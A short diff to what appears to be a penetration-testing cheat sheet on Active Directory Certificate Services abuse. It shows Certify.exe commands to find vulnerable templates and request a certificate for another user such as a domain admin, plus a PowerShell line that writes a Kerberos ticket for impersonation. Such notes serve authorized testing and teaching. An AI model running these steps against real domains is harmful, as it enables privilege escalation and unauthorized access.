@@ -1305,7 +1305,8 @@ ls \\<COMPOTERNAME FQDN>\C$
 .\Certify.exe find /vulnerable
 ```
 
-#### Request certificate
+#### Request certificate for a user
+- For example domain admin
 ```
 .\Certify.exe request /ca:<CA NAME> /template:<TEMPLATE> /altname:<USERNAME>
 ```
@@ -1325,6 +1326,8 @@ cat cert.pfx | base64 -w 0
 ```
 [System.IO.File]::WriteAllBytes("C:\Users\public\<USER>.kirbi", [System.Convert]::FromBase64String("<TICKET STRING>"))
 ```
+ 
+#### Then load TGT and request TGS or access systems as this user.
 
 ### Relaying to ADCS HTTP Endpoints
 - AD CS services support HTTP enrolment methods and even includes a GUI.  This endpoint is usually found at http[s]://<hostname>/certsrv, and by default supports NTLM and Negotiate authentication methods.
